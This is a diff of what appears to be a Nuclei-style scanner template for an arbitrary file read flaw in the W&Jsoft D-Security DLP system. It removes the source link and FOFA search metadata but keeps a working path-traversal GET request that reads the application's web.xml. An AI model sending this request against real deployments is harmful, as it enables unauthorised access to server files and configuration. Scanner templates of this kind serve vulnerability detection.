@@ -3,12 +3,8 @@ info:
   name: W&Jsoft-D-Security数据仿泄露系统(DLP)存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ts2t91yfcv65p0f3'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ts2t91yfcv65p0f3
-    fofa: icon_hash="616947260"
 http:
 - raw:
   - 'GET /DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp?logType=tomcat&logFileName=../../../../../../D-Security/webapps/DLPWebApps/WEB-INF/web.xml HTTP/1.1
